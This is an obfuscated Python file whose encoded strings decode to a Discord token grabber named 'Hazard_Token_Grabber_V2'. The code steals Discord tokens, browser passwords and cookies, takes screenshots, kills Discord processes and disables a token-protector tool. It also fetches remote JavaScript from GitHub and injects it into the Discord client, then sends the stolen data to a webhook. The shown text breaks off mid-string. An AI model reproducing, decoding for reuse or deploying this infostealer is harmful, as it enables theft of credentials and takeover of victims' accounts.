# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc2h1dGlsCmltcG9ydCBzcWxpdGUzCmltcG9ydCB6aXBmaWxlCmltcG9ydCBqc29uCmltcG9ydCBiYXNlNjQgCmltcG9ydCBwc3V0aWwKaW1wb3J0IHdpbnJlZwoKCgoKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZApmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiCmZyb20gd2luMzJjcnlwdCBpbXBvcnQgQ3J5cHRVbnByb3RlY3REYXRhCmZyb20gcmUgaW1wb3J0IGZpbmRhbGwKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKCmNsYXNzIEhhemFyZF9Ub2tlbl9HcmFiYmVyX1YyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYud2ViaG9vayA9ICJXRUJIT09LX0hFUkUiCiAgICAgICAgc2VsZi5maWxlcyA9ICIiCgogICAgICAgIHNlbGYuYmFzZXVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQogICAgICAgIHNlbGYucm9hbWluZyA9IG9zLmdldGVudigiYXBwZGF0YSIpCiAgICAgICAgc2VsZi50ZW1wZm9sZGVyID0gb3MuZ2V0ZW52KCJ0ZW1wIikrIlxcUGFyYWRpc2UiCiAgICAgICAgc2VsZi5yZWdleCA9IHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9IiwgciJtZmFcLltcdy1dezg0fSIKCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oc2VsZi50ZW1wZm9sZGVyKSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgogICAgICAgIHNlbGYudG9rZW5zID0gW10KICAgICAgICBzZWxmLmRpc2NvcmRfcHN3ID0gW10KICAgICAgICBzZWxmLmJhY2t1cF9jb2RlcyA9IFtdCiAgICAgICAgCiAgICAgICAgc2VsZi5ieXBhc3NCZXR0ZXJEaXNjb3JkKCkKICAgICAgICBzZWxmLmJ5cGFzc1Rva2VuUHJvdGVjdG9yKCkKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc2VsZi5hcHBkYXRhKydcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEnKSBvciBub3Qgb3MucGF0aC5leGlzdHMoc2VsZi5hcHBkYXRhKydcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXExvY2FsIFN0YXRlJyk6CiAgICAgICAgICAgIHNlbGYuZmlsZXMgKz0gZiJ7b3MuZ2V0bG9naW4oKX0gZG9lc24ndCBoYXZlIGdvb2dsZSBpbnN0YWxsZWRcbiIKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLmdyYWJQYXNzd29yZCgpCiAgICAgICAgICAgIHNlbGYuZ3JhYkNvb2tpZXMoKQogICAgICAgIHQgPSBUaHJlYWQodGFyZ2V0PXNlbGYuc2NyZWVuc2hvdCkKICAgICAgICB0MiA9IFRocmVhZCh0YXJnZXQ9c2VsZi5raWxsRGlzY29yZCkKICAgICAgICB0LnN0YXJ0KCk7dC5qb2luKCkKICAgICAgICB0Mi5zdGFydCgpO3QyLmpvaW4oKQogICAgICAgIHNlbGYuZ3JhYlRva2VucygpCiAgICAgICAgc2VsZi5uZWF0aWZ5VG9rZW5zKCkKICAgICAgICBmb3IgaSBpbiBbIkdvb2dsZSBQYXNzd29yZHMudHh0IiwgIkdvb2dsZSBDb29raWVzLnR4dCIsICJEaXNjb3JkIEluZm8udHh0IiwgIkRpc2NvcmQgYmFja3VwQ29kZXMudHh0Il06CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYudGVtcGZvbGRlcitvcy5zZXAraSk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oc2VsZi50ZW1wZm9sZGVyK29zLnNlcCtpLCAiciIsIGVuY29kaW5nPSJjcDQzNyIpIGFzIGZmOgogICAgICAgICAgICAgICAgICAgIHggPSBmZi5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgeDoKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHNlbGYudGVtcGZvbGRlcitvcy5zZXAraSwgInciLCBlbmNvZGluZz0iY3A0MzciKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiUGFyYWRpc2UgUHJlbWl1bSB8IGh0dHBzOi8vZGlzY29yZC5nZy9zQ1dhZ0tneUc3XG5cbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihzZWxmLnRlbXBmb2xkZXIrb3Muc2VwK2ksICJhIiwgZW5jb2Rpbmc9ImNwNDM3IikgYXMgZnA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcC53cml0ZSh4KyJcblxuUGFyYWRpc2UgUHJlbWl1bSB8IGh0dHBzOi8vZGlzY29yZC5nZy9zQ1dhZ0tneUc3IikKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi50ZW1wZm9sZGVyK29zLnNlcCtpKQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIm9rIikKCiAgICAgICAgc2VsZi5TZW5kSW5mbygpCiAgICAgICAgc2VsZi5JbmplY3Rpb24oKQogICAgICAgIHNodXRpbC5ybXRyZWUoc2VsZi50ZW1wZm9sZGVyKQogICAgICAgIAogICAgZGVmIGdldGhlYWRlcnMoc2VsZiwgdG9rZW49Tm9uZSwgY29udGVudF90eXBlPSJhcHBsaWNhdGlvbi9qc29uIik6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6IGNvbnRlbnRfdHlwZSwKICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEiCiAgICAgICAgfQogICAgICAgIGlmIHRva2VuOgogICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pCiAgICAgICAgcmV0dXJuIGhlYWRlcnMKCiAgICBkZWYgSW5qZWN0aW9uKHNlbGYpOgogICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuYXBwZGF0YSk6CiAgICAgICAgICAgIGZvciBuYW1lIGluIGRpcnM6CiAgICAgICAgICAgICAgICBpZiAiZGlzY29yZF9kZXNrdG9wX2NvcmUtIiBpbiBuYW1lOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgZGlyZWN0b3J5X2xpc3QgPSBvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSsiXFxkaXNjb3JkX2Rlc2t0b3BfY29yZVxcaW5kZXguanMiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKHJvb3QsIG5hbWUrIlxcZGlzY29yZF9kZXNrdG9wX2NvcmVcXFBhcmFkaXNlIikpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEZpbGVFeGlzdHNFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgIGYgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BaW5zbGV5My9waXJhdGVzdGVhbGVyLmdpdGh1Yi5pby9tYWluL3RyeHkuanMiKS50ZXh0LnJlcGxhY2UoIiVXRUJIT09LX0xJTkslIiwgc2VsZi53ZWJob29rKQogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihkaXJlY3RvcnlfbGlzdCwgJ3cnLCBlbmNvZGluZz0idXRmLTgiKSBhcyBpbmRleF9maWxlOgogICAgICAgICAgICAgICAgICAgICAgICBpbmRleF9maWxlLndyaXRlKGYpCiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoc2VsZi5yb2FtaW5nKyJcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXERpc2NvcmQgSW5jIik6CiAgICAgICAgICAgIGZvciBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgZGlzY29yZF9maWxlID0gb3MucGF0aC5qb2luKHJvb3QsIG5hbWUpCiAgICAgICAgICAgICAgICBvcy5zdGFydGZpbGUoZGlzY29yZF9maWxlKQoKICAgIGRlZiBraWxsRGlzY29yZChzZWxmKToKICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6CiAgICAgICAgICAgIGlmIGFueShwcm9jc3RyIGluIHByb2MubmFtZSgpLmxvd2VyKCkgZm9yIHByb2NzdHIgaW5cCiAgICAgICAgICAgIFsnZGlzY29yZCcsICdkaXNjb3JkdG9rZW5wcm90ZWN0b3InLCAnZGlzY29yZGNhbmFyeScsICdkaXNjb3JkZGV2ZWxvcG1lbnQnLCAnZGlzY29yZHB0YiddKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBwcm9jLmtpbGwoKQogICAgICAgICAgICAgICAgZXhjZXB0IHBzdXRpbC5Ob1N1Y2hQcm9jZXNzOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgYnlwYXNzVG9rZW5Qcm90ZWN0b3Ioc2VsZik6CiAgICAgICAgI2Z1Y2tzIHVwIHRoZSBkaXNjb3JkIHRva2VuIHByb3RlY3RvciBieSBodHRwczovL2dpdGh1Yi5jb20vYW5kcm8yMTU3L0Rpc2NvcmRUb2tlblByb3RlY3RvcgogICAgICAgIHRwID0gZiJ7c2VsZi5yb2FtaW5nfVxcRGlzY29yZFRva2VuUHJvdGVjdG9yXFwiCiAgICAgICAgY29uZmlnID0gdHArImNvbmZpZy5qc29uIgogICAgICAgIGZvciBpIGluIFsiRGlzY29yZFRva2VuUHJvdGVjdG9yLmV4ZSIsICJQcm90ZWN0aW9uUGF5bG9hZC5kbGwiLCAic2VjdXJlLmRhdCJdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUodHAraSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MgCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnKSBhcyBmOgogICAgICAgICAgICAgICAgaXRlbSA9IGpzb24ubG9hZChmKQogICAgICAgICAgICAgICAgaXRlbVsnYXV0b19zdGFydCddID0gVHJ1ZQogICAgICAgICAgICAgICAgaXRlbVsnYXV0b19zdGFydF9kaXNjb3JkJ10gPSBUcnVlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHknXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfYWxsb3diZXR0ZXJkaXNjb3JkJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNrZXhlY3V0YWJsZSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja2hhc2gnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2ttb2R1bGUnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2tzY3JpcHRzJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNrcmVzb3VyY2UnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfcmVkb3dubG9hZGhhc2hlcyddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2l0ZXJhdGlvbnNfaXYnXSA9IDM2NAogICAgICAgICAgICAgICA'
love = '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'
god = 'BkZWYgZ3JhYlRva2VucyhzZWxmKToKICAgICAgICBwYXRocyA9IHsKICAgICAgICAgICAgJ0Rpc2NvcmQnOiBzZWxmLnJvYW1pbmcgKyByJ1xcZGlzY29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogc2VsZi5yb2FtaW5nICsgcidcXGRpc2NvcmRjYW5hcnlcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdMaWdodGNvcmQnOiBzZWxmLnJvYW1pbmcgKyByJ1xcTGlnaHRjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRGlzY29yZCBQVEInOiBzZWxmLnJvYW1pbmcgKyByJ1xcZGlzY29yZHB0YlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09wZXJhJzogc2VsZi5yb2FtaW5nICsgcidcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcGVyYSBHWCc6IHNlbGYucm9hbWluZyArIHInXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQW1pZ28nOiBzZWxmLmFwcGRhdGEgKyByJ1xcQW1pZ29cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1RvcmNoJzogc2VsZi5hcHBkYXRhICsgcidcXFRvcmNoXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdLb21ldGEnOiBzZWxmLmFwcGRhdGEgKyByJ1xcS29tZXRhXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcmJpdHVtJzogc2VsZi5hcHBkYXRhICsgcidcXE9yYml0dW1cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0NlbnRCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgcidcXENlbnRCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICc3U3Rhcic6IHNlbGYuYXBwZGF0YSArIHInXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1NwdXRuaWsnOiBzZWxmLmFwcGRhdGEgKyByJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogI